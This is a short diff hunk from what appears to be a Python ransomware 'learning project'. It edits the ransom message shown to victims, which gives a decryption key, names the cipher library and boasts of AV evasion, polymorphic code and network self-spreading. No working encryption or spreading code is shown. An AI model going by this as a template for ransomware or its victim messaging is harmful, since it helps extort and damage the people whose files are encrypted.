@@ -8,7 +8,7 @@ def parse_dir(root, folder):
     """# //TODO: add doc for this whole thing"""
     try:
         msg = f"""  this is a learning project only. if by any case you got injured by this
-                        im really sorry, use the key {key} to decrypt, i used fernet in python. {encryptor}.\n'
+                        im really sorry, use the key {key} to decrypt, we used pyAesCrypt .\n'
                         This Project is aimed to show that python can be quite malicious, python easy syntax
                         and readability can provide a nice and comfortable platform to create malicious files
                         with advanced AV Evasion, meta/poly morphic capabilities, self-spreading in network,
